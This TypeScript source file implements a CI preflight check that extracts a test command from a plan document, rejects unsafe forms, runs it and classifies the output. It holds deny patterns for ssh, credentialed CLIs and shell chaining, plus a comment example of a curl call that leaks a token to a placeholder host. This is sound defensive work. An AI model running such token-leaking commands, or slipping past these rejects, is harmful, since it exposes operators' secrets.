/**
 * Reference implementation of preflight Check 10's parser + classifier.
 *
 * The production runtime is the bash in `plugins/soleur/skills/preflight/SKILL.md`
 * §"Check 10: Discoverability Test Execution". This TypeScript mirror exists
 * so the 8 decision states can be unit-tested without subshells, fake `curl`,
 * or live network. If the bash and TS drift, the bash wins and this file
 * is the bug.
 */

export type ExecResult = { rc: number; stdout: string };
export type Executor = (cmd: string, timeoutMs: number) => Promise<ExecResult>;

export type ClassificationResult = {
  result: "PASS" | "FAIL" | "SKIP";
  reason?: string;
};

export type ClassifyInput = {
  planPath: string;
  planBody: string;
  prBody: string;
  runner: Executor;
  timeoutMs?: number;
};

// Use POSIX [:space:] equivalent (not \s) so the TS reject regex behaves
// identically to bash's [[:space:]] in C-locale. \s in JS matches Unicode
// whitespace (U+00A0, U+2028, etc.); bash [[:space:]] in C-locale does not.
// Keeping the surface narrow avoids cross-runtime drift bypasses.
const SSH_REJECT_RE = /(^|[\t\n\r \f\v/])ssh([\t\n\r \f\v]|$)/;

// Credentialed CLIs — mirrors SKILL.md Step 10.4. Check 10 runs `$CMD` with the
// operator's ambient FILE-BACKED CLI auth reachable: `env -i` scrubs env vars
// but preserves $HOME, so e.g. the Doppler CLI still reads a live `dp.ct.*`
// token from ~/.doppler/.doppler.yaml.
//
// This is the load-bearing control for the #6772 folded-scalar fix, which is a
// fail-open transition — commands that used to parse to the literal `>` and
// self-reject now reach execution. A folded scalar joins with a SPACE and so
// carries no shell-active token by construction; SUBST_REJECT_RE therefore
// covers none of that class. Only this verb reject does.
//
// The `/` in the leading class catches `/usr/local/bin/gh`; the trailing
// boundary keeps `curl https://app.soleur.ai/highlights` runnable.
const CRED_REJECT_RE =
  /(^|[\t\n\r \f\v/])(doppler|gh|aws|supabase|stripe)([\t\n\r \f\v]|$)/;

// Shell-active tokens that route command output / chain commands / spawn
// subshells / expand vars. The plan author is trust-on-PR-review but the env
// scrub in SKILL.md Step 10.5 is the load-bearing mitigation — this regex
// is defense-in-depth. Note: `$` (parameter expansion) IS rejected to block
// `curl https://api.example.com/?leak=$TOKEN` even with env scrub.
//
// `\n` closes BLOCK-mode chaining only: a block scalar joins with newlines,
// which `bash -c` runs as separate statements. It contributes zero coverage to
// folded scalars — see CRED_REJECT_RE above.
const SUBST_REJECT_RE = /(\$\(|`|<\(|>\(|;|&&|\|\||\||>|<|&|\n|\$\{?[A-Za-z_])/;

// Return the body of EVERY `## Observability` section (each: lines after the
// heading up to the next `^## ` heading). A doc may carry several such sections
// (e.g. plan-issue-templates.md ships one per verbosity tier), which the
// schema-parity guard walks. `extractObservabilityBlock` below is the
// first-block-only view the preflight runtime consumes.
export function extractAllObservabilityBlocks(planBody: string): string[] {
  const lines = planBody.split(/\r?\n/);
  const blocks: string[] = [];
  let collected: string[] | null = null;
  for (const line of lines) {
    if (/^## Observability(?:\s|$)/.test(line)) {
      if (collected) blocks.push(collected.join("\n"));
      collected = [];
      continue;
    }
    if (collected && /^## /.test(line)) {
      blocks.push(collected.join("\n"));
      collected = null;
      continue;
    }
    if (collected) collected.push(line);
  }
  if (collected) blocks.push(collected.join("\n"));
  return blocks;
}

// First `## Observability` section body — the view the preflight runtime consumes
// (plan bodies carry a single such section). NOTE: not byte-identical to a hand-
// written first-only loop for the malformed case of two ADJACENT `## Observability`
// headings with no intervening `^## ` — the old loop merged their bodies, this
// returns only the first. That input does not occur in real plans, so preflight
// behavior is unchanged; the split-then-`[0]` shape is what the parity guard needs.
export function extractObservabilityBlock(planBody: string): string {
  return extractAllObservabilityBlocks(planBody)[0] ?? "";
}

// Horizontal whitespace, POSIX [[:space:]] minus \n (lines are already split)
// and minus \r (stripped by the split — the documented CRLF divergence from awk).
// Deliberately NOT `\s`, which matches Unicode whitespace bash does not.
const H = "[ \\t\\f\\v]";
const FOLD_HEADER_RE = new RegExp(`^${H}*command:${H}*>[-+]?${H}*(#.*)?$`);
const BLOCK_HEADER_RE = new RegExp(`^${H}*command:${H}*\\|[-+]?${H}*(#.*)?$`);
const INLINE_KEY_RE = new RegExp(`^${H}*command:${H}*(\\S.*)$`);
const BLANK_RE = new RegExp(`^${H}*$`);

const indentOf = (line: string): number =>
  (new RegExp(`^${H}*`).exec(line)?.[0] ?? "").length;

export function parseCommand(observabilityBlock: string): string {
  const lines = observabilityBlock.split(/\r?\n/);

  // Form A — strict YAML key (strongest signal).
  //
  // Mirrors plugins/soleur/skills/preflight/scripts/parse-form-a.awk. That file
  // is authoritative; if these drift, the awk wins and this is the bug.
  //
  // Scalar extent follows YAML indent semantics: a continuation is a non-empty
  // line indented MORE than the `command:` key, and the first line indented <=
  // the key ends the scalar. No key-name matching — a key regex both truncates
  // legitimate content (a jq object filter's `host_present:`) and leaves a
  // differential where a LESS-indented non-key line is consumed anyway, which a
  // PR reviewer reads as outside the command but the shell executes.
  let mode: "fold" | "block" | null = null;
  let keyIndent = 0;
  const scalarLines: string[] = [];
  for (const line of lines) {
    if (mode === null) {
      // Fold/block headers MUST be tested before the inline rule: the inline
      // pattern also matches `command: >-` and would return the literal
      // indicator, which then self-rejects as a shell-active token (#6772).
      if (FOLD_HEADER_RE.test(line)) {
        mode = "fold";
        keyIndent = indentOf(line);
        continue;
      }
      if (BLOCK_HEADER_RE.test(line)) {
        mode = "block";
        keyIndent = indentOf(line);
        continue;
      }
      const inlineKey = line.match(INLINE_KEY_RE);
      if (inlineKey) return stripQuotes(inlineKey[1].trim());
      continue;
    }
    // Blank lines are legal inside a scalar and carry no indentation, so this
    // MUST precede the terminator or indentOf("") === 0 would end every scalar
    // at its first blank line. The awk drops them; this mirrors that (it used
    // to push "" and emit a spurious empty line).
    if (BLANK_RE.test(line)) continue;
    if (indentOf(line) <= keyIndent) break;
    scalarLines.push(line.replace(new RegExp(`^${H}+`), ""));
  }
  if (scalarLines.length > 0) {
    return scalarLines.join(mode === "fold" ? " " : "\n");
  }

  // Form B — prose `discoverability_test` marker + first fenced code block.
  let sawMarker = false;
  let inFence = false;
  const fenceLines: string[] = [];
  for (const line of lines) {
    if (!sawMarker && /discoverability_test/.test(line)) {
      sawMarker = true;
      continue;
    }
    if (!sawMarker) continue;
    if (/^\s*```/.test(line)) {
      if (!inFence) {
        inFence = true;
        continue;
      }
      break;
    }
    if (inFence) {
      if (/^\s*#/.test(line)) continue;
      fenceLines.push(line);
    }
  }
  return fenceLines.join("\n").trim();
}

export function parseExpected(observabilityBlock: string): string {
  const lines = observabilityBlock.split(/\r?\n/);
  for (const line of lines) {
    const yamlKey = line.match(/^\s*expected_output:\s*(.+)$/);
    if (yamlKey) return stripQuotes(yamlKey[1].trim());
  }
  // Prose form accepts bold-wrapped (`**Expected output:**`) since markdown
  // plans frequently bold the inline label. Both `Expected output:` and
  // `**Expected output:**` produce the same captured value.
  for (const line of lines) {
    const prose = line.match(/^\s*(?:\*\*)?Expected output:(?:\*\*)?\s*(.+)$/i);
    if (prose) return stripQuotes(prose[1].trim());
  }
  return "";
}

export function matchExpected(expected: string, actualStdout: string): boolean {
  const normalized = actualStdout.replace(/\n+$/, "").trim();
  if (normalized === "") return false;
  const tokens = tokenizeExpected(expected);
  return tokens.some((tok) => {
    if (tok === "") return false;
    // Short tokens (≤ 2 chars) match only when stdout is exactly the token —
    // prevents `expected_output: "0"` matching every HTTP error response that
    // happens to contain a `0` digit (500, 404, 200, 302, etc.).
    if (tok.length <= 2) return normalized === tok;
    return normalized.includes(tok);
  });
}

export function tokenizeExpected(expected: string): string[] {
  return expected
    .split(/,|\s+or\s+|\bor\b|[`"'\[\]/]+/i)
    .map((s) => s.trim())
    .filter((s) => s.length > 0);
}

export function rejectReason(cmd: string): string | null {
  if (SSH_REJECT_RE.test(cmd)) {
    return "discoverability_test.command contains ssh (rule violation per hr-observability-as-plan-quality-gate)";
  }
  // Ordered to mirror the runtime: Step 10.4's verb rejects run before Step
  // 10.5's shell-active-token reject.
  if (CRED_REJECT_RE.test(cmd)) {
    return "discoverability_test.command invokes a credentialed CLI (doppler/gh/aws/supabase/stripe); refusing to run. Check 10 executes with the operator's ambient file-backed CLI auth reachable (env -i does not scrub it — $HOME is preserved). Use an unauthenticated probe instead.";
  }
  if (SUBST_REJECT_RE.test(cmd)) {
    return "discoverability_test.command contains shell-active token (;, &&, ||, |, >, <, &, $var, $(, `, <(, >() — refusing to run. Plans must compose single-statement commands without chaining or substitution.";
  }
  return null;
}

export async function classifyDiscoverabilityResult(
  input: ClassifyInput,
): Promise<ClassificationResult> {
  const { planPath, planBody, runner, timeoutMs = 15_000 } = input;

  if (!planPath || planBody === "") {
    return {
      result: "SKIP",
      reason:
        "no plan file linked from PR body — Check 10 deferred to next preflight run after PR has a plan link",
    };
  }

  const block = extractObservabilityBlock(planBody);
  if (block === "") {
    return {
      result: "FAIL",
      reason: `plan ${planPath} is missing the ## Observability block (sensitive-path diff requires one per hr-observability-as-plan-quality-gate)`,
    };
  }

  const cmd = parseCommand(block);
  if (cmd === "") {
    return {
      result: "FAIL",
      reason: `plan ${planPath} declares an Observability block but no discoverability_test.command could be parsed (see plan-issue-templates.md §Observability for the canonical YAML schema)`,
    };
  }

  const rejected = rejectReason(cmd);
  if (rejected !== null) return { result: "FAIL", reason: rejected };

  const expected = parseExpected(block);
  const result = await runner(cmd, timeoutMs);

  if (result.rc === 6) {
    return {
      result: "FAIL",
      reason: `command failed DNS resolution (curl rc=6 — hostname did not resolve). Verify the hostname in plan ${planPath}'s discoverability_test.command.`,
    };
  }

  if (result.rc === 28 || result.rc === 124) {
    return {
      result: "FAIL",
      reason: `command timed out after ${timeoutMs} ms (rc=${result.rc}). Either the endpoint is unreachable or the command lacks --max-time.`,
    };
  }

  if (result.rc === 22 && /401|403/.test(result.stdout)) {
    const tokens = tokenizeExpected(expected);
    const listsAuth = tokens.some((t) => /401|403/.test(t));
    if (!listsAuth) {
      return {
        result: "SKIP",
        reason: `auth-gated probe returned ${result.stdout.trim()} but expected_output does not list 401/403. Add the auth shape to expected_output OR provision Doppler creds for the probe variant.`,
      };
    }
  }

  if (!matchExpected(expected, result.stdout)) {
    return {
      result: "FAIL",
      reason: `stdout mismatch: command returned ${JSON.stringify(result.stdout.trim())}, expected_output was ${JSON.stringify(expected)} (rc=${result.rc}). Plan's expectation has drifted from production reality.`,
    };
  }

  return { result: "PASS" };
}

function stripQuotes(value: string): string {
  return value.replace(/^["'](.*)["']$/, "$1");
}
